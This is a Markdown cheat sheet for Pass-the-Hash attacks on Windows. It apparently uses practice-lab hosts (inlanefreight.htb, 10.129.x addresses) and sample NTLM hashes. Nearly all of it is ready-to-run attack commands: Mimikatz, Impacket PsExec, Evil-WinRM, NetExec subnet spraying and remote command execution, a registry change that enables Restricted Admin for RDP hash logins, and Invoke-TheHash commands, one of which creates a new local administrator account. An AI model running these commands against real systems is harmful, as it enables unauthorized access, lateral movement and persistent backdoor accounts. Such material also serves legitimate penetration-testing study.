# Pass the Hash

## Overview

* Pass-the-Hash uses an NTLM hash to authenticate without knowing the plaintext password
* Works with NTLM authentication — does NOT work with Kerberos alone

## UAC Limitation

* Registry key: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
* Value `0` = only RID-500 (built-in Administrator) can PtH remotely
* Value `1` = all local admins can PtH

## PtH - Mimikatz

```
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

## PtH - Impacket PsExec

```
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

## PtH - Evil-WinRM

```
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

## PtH - NetExec (Spray Subnet)

```
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

## PtH - NetExec (Command Exec)

```
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

## PtH - RDP (xfreerdp)

* Must enable Restricted Admin mode first:

```
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

## PtH - Invoke-TheHash (SMB Exec)

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

## PtH - Invoke-TheHash (WMI Exec)

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "hostname"
```
